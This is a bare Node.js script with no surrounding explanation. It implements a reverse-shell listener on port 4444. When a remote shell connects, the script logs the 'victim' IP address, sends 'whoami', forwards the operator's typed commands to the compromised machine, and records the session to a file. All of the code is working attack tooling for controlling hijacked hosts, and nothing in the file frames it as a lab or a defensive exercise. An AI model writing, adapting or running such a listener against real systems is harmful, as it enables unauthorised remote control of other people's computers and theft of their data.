const net = require('net');
const fs = require('fs');
const readline = require('readline');

const PORT = 4444;
const LOG_FILE = 'session.log';

let currentSocket = null;

// Create readline interface for user input
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const server = net.createServer((socket) => {
    console.log('\n[+] Client connected:', socket.remoteAddress + ':' + socket.remotePort);
    console.log('[+] Victim IP:', socket.remoteAddress);
    currentSocket = socket;
    
    // Log all communications
    const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });
    logStream.write(`\n=== New session started at ${new Date()} ===\n`);
    logStream.write(`Client: ${socket.remoteAddress}:${socket.remotePort}\n`);
    
    // Send initial command
    socket.write('whoami\n');
    
    socket.on('data', (data) => {
        const output = data.toString();
        process.stdout.write(output);
        logStream.write(output);
    });
    
    socket.on('close', () => {
        console.log('\n[-] Client disconnected');
        logStream.write(`\n=== Session ended at ${new Date()} ===\n`);
        logStream.end();
        currentSocket = null;
    });
    
    socket.on('error', (err) => {
        console.error('Socket error:', err.message);
    });
});

// Handle user input
rl.on('line', (input) => {
    if (currentSocket && !currentSocket.destroyed) {
        currentSocket.write(input + '\n');
    } else {
        console.log('No active connection');
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`[*] Listening on 0.0.0.0:${PORT}`);
    console.log('[*] Waiting for connections...');
    console.log('[*] Press Ctrl+C to exit');
});

server.on('error', (err) => {
    console.error('Server error:', err.message);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n[*] Shutting down server...');
    server.close();
    rl.close();
    process.exit(0);
});